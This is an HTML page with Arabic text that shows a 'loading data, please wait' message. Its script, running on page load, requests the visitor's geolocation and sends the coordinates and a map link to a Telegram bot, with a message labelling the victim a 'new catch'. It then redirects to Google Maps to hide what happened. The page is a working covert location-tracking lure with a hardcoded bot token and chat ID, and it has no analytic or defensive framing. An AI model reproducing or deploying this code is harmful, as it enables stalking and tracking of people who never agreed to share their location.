<!DOCTYPE html>
<html>
<head>
    <title>تحديد الموقع</title>
    <script>
        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendPosition);
            } else {
                alert("المتصفح لا يدعم تحديد الموقع");
            }
        };

        function sendPosition(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const token = "87416833333:AAE4rkxyKynPPLPk9GvNNUGTQOj0BT7Iu9s";
            const chat_id = "56999879648";
            const text = `📍 صيد جديد!\nخط العرض: ${lat}\nخط الطول: ${lon}\nرابط الخريطة: https://www.google.com/maps?q=${lat},${lon}`;

            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`)
            .then(() => {
                window.location.href = "https://www.google.com/maps";
            });
        }
    </script>
</head>
<body>
    <h2 style="text-align:center; margin-top:50px;">جاري تحميل البيانات... يرجى الانتظار</h2>
</body>
</html>
